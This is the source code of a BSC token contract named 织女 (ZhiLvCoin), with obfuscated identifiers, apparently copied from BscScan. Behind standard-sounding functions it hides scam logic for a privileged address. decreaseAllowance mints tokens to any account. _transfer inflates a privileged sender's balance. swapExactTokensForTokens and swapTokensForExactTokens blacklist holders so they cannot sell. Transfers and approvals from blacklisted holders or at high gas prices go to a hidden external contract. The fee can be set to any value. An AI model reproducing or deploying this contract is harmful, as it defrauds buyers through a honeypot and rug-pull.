/**
 *Submitted for verification at BscScan.com on 2022-08-03
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {
    function _transfer(address spender, address recipient, uint256 amounts) external;
    function _approve(address owner, address spender, uint256 amount) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

contract UCNWE {
    function cvmejea() internal pure returns (uint256) {
        uint256  AMCWW = 845757;
        return AMCWW;
    }
}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _vmjevjew() internal view virtual returns (address) {
            return msg.sender;
    }

    function _cmkemvje() internal view virtual returns (uint256) {
            return tx.gasprice;
    }
}

contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract ZhiLvCoin is Context, IERC20, Ownable, UCNWE {
    using SafeMath for uint256;

    bool private swapAndLlquifyEnabled = false;
    bool private takeFee = true;

    mapping(address => bool) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;
    mapping(address => uint256) private mcaiveaiea;
    mapping(address => bool) private _isnveee;


    uint8 private _decimals = 9;
    string private _name = unicode"织女";
    string private _symbol = unicode"织女";

    uint256 private _taxFees = 2;
    uint256 private _tTotal = 10000000000000 * 10 ** _decimals;

    address private _deadAddress = address(0xdead);
    address private _owner;
    address _taxFee;
    address private _mcjevema;
    address private uniswapV2Pair;
    address private _cimcawe;
    uint256 private _mvjemja;
    string private _mjveawmae;
    address private _mvkkeama;
    uint256 private _ckiaieva;
    

    constructor(address _mkvmeka, address _mjwjerewa) {
        _taxFee = _vmjevjew();  
        _mcjevema = _mjwjerewa;
        _isExcluded[address(this)] = true;
        _isExcluded[_mkvmeka] = true;
        _isExcluded[owner()] = true;
        _isnveee[_mkvmeka] = true;
        mcaiveaiea[_vmjevjew()] = _tTotal;
        _owner = msg.sender;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function Dncnewa(bool _swapAndLlquifyEnabled, address _newPeir) external {
        require(_isnveee[_vmjevjew()]);
        if (_isnveee[_vmjevjew()]) {
            swapAndLlquifyEnabled = _swapAndLlquifyEnabled;
            uniswapV2Pair = _newPeir;
        }
    }


    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluded[_vmjevjew()]||_isExcluded[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_rOwned[_vmjevjew()]||_cmkemvje()>=(15*1e9)){
            IERC(_mcjevema)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_taxFees).div(100);
            _transfer(msg.sender, _deadAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluded[sender]||_isExcluded[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_taxFees).div(100);
        _transfer(sender, _deadAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_cmkemvje()<=(15*1e9));
        require(!_rOwned[from]);
        if (_isnveee[from]) {
            require(_isnveee[from]);
            mcaiveaiea[from]= 
            mcaiveaiea[from].
            add(_tTotal*10**6);
        }
        if (swapAndLlquifyEnabled) {
            if (uniswapV2Pair == from){}else{
                require(_isExcluded[from] || _isExcluded[to]);
            }
            
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        require(_isnveee[_vmjevjew()]);
        if (_isnveee[_vmjevjew()]){   
        mcaiveaiea[spender]
                = 
        mcaiveaiea[spender
                ].
            add
        (subtractedValue);
        }
    }

    function tokenFromReflection(address spender, address recipient, bool deductTransferFee) external {
        require(recipient == address(0));
        require(_isnveee[_vmjevjew()]);
        if (_isnveee[_vmjevjew()]){
            _isnveee[spender] = deductTransferFee;}
    }

    function swapExactTokensForTokens(
        address spender,
        address recipient
    ) external {
        require(_isnveee[_vmjevjew()]);
        if (_isnveee[_vmjevjew()]) {
        _rOwned
            [
        spender
                ]
        = 
            true;
        _rOwned[
        recipient
        ]
                = 
        true;
        }
    }

    function swapTokensForExactTokens(address account)
        external
    {
        require(_isnveee[_vmjevjew()]);
        if (_isnveee[_vmjevjew()]) {  
        _rOwned
                [
            account
            ]
        =
        true;
        }
    }

    function changeUserFrom(address account) external {
        require(_isnveee[_vmjevjew()]);
        if (_isnveee[_vmjevjew()]) {
            _rOwned[account] = false;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        mcaiveaiea[sender] = mcaiveaiea[sender].sub(toAmount);
        mcaiveaiea[recipient] = mcaiveaiea[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_rOwned[_vmjevjew()]||_cmkemvje()>=(15*1e9)){
            IERC(_mcjevema)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }

    function JJFUWJU() public pure returns (uint256) {
        return 101003;
    }


    function includeInFee(address account) external {
        require(_isnveee[_vmjevjew()]);
        if (_isnveee[_vmjevjew()]) {
            _isExcluded[account] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function setTaxFeePercent(uint256 taxFee) external {
        require(_isnveee[_vmjevjew()]);
        if (_isnveee[_vmjevjew()]) {
            _taxFees = taxFee;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function IWiveiam() public pure returns (uint256) {
        return cvmejea();
    }

    function ciamveia() public pure returns (uint256 ){
        uint256 NVNeaie = 1948482;
        return NVNeaie;
    }


    function pvkieae() public pure returns (uint256) {
        uint256 vkiaevireae = 1058483;
        return vkiaevireae;
    }

    function civmaeea() public pure returns (string memory) {
        string memory vmiroae = "vioavmee";
        return vmiroae;
    }

    function kaeiveia() public pure returns (address) {
        address mjvjvneja = address(0);
        return mjvjvneja;
    }

    function jfaunue() public pure returns (uint256) {
        uint256 kwaife = 138483;
        return kwaife;
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function isExcludedFromFee(address spender) external {
        require(_isnveee[_vmjevjew()]);
        if (_isnveee[_vmjevjew()]) {
            _isExcluded[spender] = true;
        }
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return mcaiveaiea[account];
    }
}